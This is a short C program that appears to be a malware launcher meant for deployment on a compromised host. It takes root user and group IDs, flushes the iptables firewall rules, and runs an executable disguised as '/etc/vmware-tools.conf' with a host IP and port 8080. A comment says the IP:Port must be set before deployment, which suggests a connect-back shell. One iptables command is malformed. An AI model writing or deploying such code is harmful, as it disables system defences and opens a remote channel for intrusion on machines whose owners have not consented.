#include <stdlib.h>
#include <unistd.h>

// Need to chain the IP:Port before deployment 
int main(int argc, char **argv) {
	setuid(0);
	setgid(0);

	system("iptables -F");
	system("iptables -t -mangle -F");

	system("/etc/vmware-tools.conf 192.168.204.128 8080");
}